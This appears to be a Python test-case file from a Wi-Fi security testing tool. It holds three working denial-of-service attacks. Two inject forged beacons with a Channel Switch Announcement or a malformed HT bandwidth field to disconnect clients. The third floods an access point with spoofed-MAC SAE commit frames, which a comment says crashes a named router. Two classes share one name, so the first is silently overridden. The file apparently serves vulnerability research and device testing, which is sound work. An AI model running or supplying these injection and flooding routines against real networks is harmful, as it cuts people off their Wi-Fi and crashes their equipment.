# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from dependencies.libwifi.crypto import decrypt_ccmp
from library.testcase import Trigger, Action, Test


class DosBeaconCSA(Test):
	"""
	Inject a beacon with a CSA element to make the client disconnect.
	
	./load-config.sh wpa3-personal-pmf
	"""
	name = "dos-beacon-csa"
	kind = Test.Authenticator
	
	def __init__(self):
		super().__init__([
			# Capture a beacon
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			# When the client is connected, inject two beacon CSAs
			Action( trigger=Trigger.Connected, action=Action.Function ),
			# Now do an SA Query to see if the client is still here
			Action( trigger=Trigger.NoTrigger, action=Action.Function ),
			# If the station is disconnected, we can terminate the test
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		self.beacon_csa = None


	def receive(self, station, frame):
		if Dot11Beacon in frame and frame.addr2 == station.mac:
			log(DEBUG, f"Received beacon: " + repr(frame))
			self.beacon = frame
			#self.do_disconnect(station)
			return True


	def do_disconnect(self, station):
		channel = orb(get_element(self.beacon, IEEE_TLV_TYPE_CHANNEL).info)
		newchannel = 1 if channel >= 6 else 11

		# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
		# followed by one with a value of 1. When starting with 1 it errors out.
		csabeacon = append_csa(self.beacon, newchannel, 2)
		station.inject_mon(csabeacon)

		csabeacon = append_csa(self.beacon, newchannel, 1)
		station.inject_mon(csabeacon)


	def do_sa_query(self, station):
		log(WARNING, f"SA Query with {station.peermac}")
		station.wpaspy_command("SET disconnect_on_sa_timeout 1")
		station.wpaspy_command("START_SA_QUERY " + station.peermac)


	def generate(self, station):
		self.actions[0].set_receive(self.receive, mon=True)
		self.actions[1].set_function( self.do_disconnect )
		self.actions[2].set_function( self.do_sa_query )
		self.actions[2].set_delay( 1 )


class DosBeaconCSA(Test):
	"""
	Inject a beacon with an invalid bandwidth value to make the client disconnect.
	
	Make sure to load approriate configuration:

		cd setup
		unlink hostapd.conf
		ln -s hostapd-wpa3-personal-pmf-bw.conf hostapd.conf

	This config contains (among other things):

		channel=1
		hw_mode=g
		ieee80211n=1
		ht_capab=[HT40+]
		force_40mhz=1

	Now the adversary can modify the HT Information in a beacon to state the secondary
	channel is below the primary channel. This change will cause vulnerable clients
	to disconnect.

	Note that hostapd by default may refuse to use channel bandwidth of 40MHz. We
	modified hostapd to force it to use 40MHz channels (parameter force_40mhz=1).
	"""
	name = "dos-beacon-bandwidth"
	kind = Test.Authenticator
	
	def __init__(self):
		super().__init__([
			# Capture a beacon
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			# When the client is connected, inject beacons with wrong bandwidth
			Action( trigger=Trigger.Connected, action=Action.Function ),
			# If the station is disconnected, we can terminate the test
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		self.beacon_csa = None


	def receive(self, station, frame):
		if Dot11Beacon in frame and frame.addr2 == station.mac:
			log(DEBUG, f"Received beacon: " + repr(frame))
			self.beacon = frame
			#self.do_disconnect(station)
			return True


	def do_disconnect(self, station):
		beacon = self.beacon.copy()
		el = get_element(beacon, 61)
		log(STATUS, f"Element: {el}")

		# Change to "secondary channel is below the primary channel" which is impossible
		# because the AP is operating on channel 1
		el.info = el.info[:1] + b"\x07" + el.info[2:]

		for i in range(10):
			station.inject_mon(beacon)
			time.sleep(0.1)


	def generate(self, station):
		self.actions[0].set_receive(self.receive, mon=True)
		self.actions[1].set_function( self.do_disconnect )


class DosSaeFlood(Test):
	"""Send a flood of SAE handshake messages to try to crash the AP."""
	name = "dos-sae-flood"
	kind = Test.Supplicant
	
	def __init__(self):
		super().__init__([
			# Inject an invalid Association Request.
			Action( trigger=Trigger.Connected, action=Action.Function ),
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])
		self.next_mac = [0, 0, 0, 0, 0, 1]


	def goto_next_mac(self):
		i = 5
		while i >= 0:
			self.next_mac[i] = (self.next_mac[i] + 1) % 256
			if self.next_mac[i] != 0:
				break
			i -= 1


	def do_sae_flood(self, station):
		# captured SAE-commit values
		GROUP_ID = b"\x13\x00"
		SCALAR = (
			b"\x7a\x21\x9f\xdb\xae\x1e\x06\x29\x31\x8b\xad"
			b"\x0e\x4c\xbd\x4d\xcd\x59\xe6\x97\x18\x69\x50"
			b"\x03\x67\x91\x11\x2d\x59\xb6\x97\xd5\xbb"
		)
		ELEMENT = (
			b"\x25\x5d\x1a\xb4\xb3\x79\x00\xa6\x56\xe4\x0c\xaa\xfe"
			b"\x19\x3d\x0f\xed\xcf\xe5\x8c\x30\x4a\x9e\x71\x8a\x0f"
			b"\x24\x76\xeb\x9a\x53\x78\x5d\xab\xb3\x7f\x34\xe3\x19"
			b"\x40\x9d\xf3\xab\x08\xd6\x75\x4a\x07\x60\xc5\x86\xa5"
			b"\xd3\xa1\x60\xd3\x66\x98\x5e\x58\x15\x1d\x03\x27"
		)
		frame = (Dot11(addr1=station.peermac, addr3=station.peermac) /
				 Dot11Auth(algo=3, seqnum=1, status=0) /
				 GROUP_ID / SCALAR / ELEMENT)

		# In my experiments the DIR-X1860 router will crash and reboot after
		# roughly 400 SAE commit frames have been injected.
		for i in range(500):
			frame.addr2 = ":".join(["%02X" % b for b in self.next_mac])
			self.goto_next_mac()

			station.inject_mon(frame)
			time.sleep(0.1)
			if i % 10 == 0:
				print(f"Injected {i} SAE commit frames so far...")


	def generate(self, station):
		self.actions[0].set_function(self.do_sae_flood)

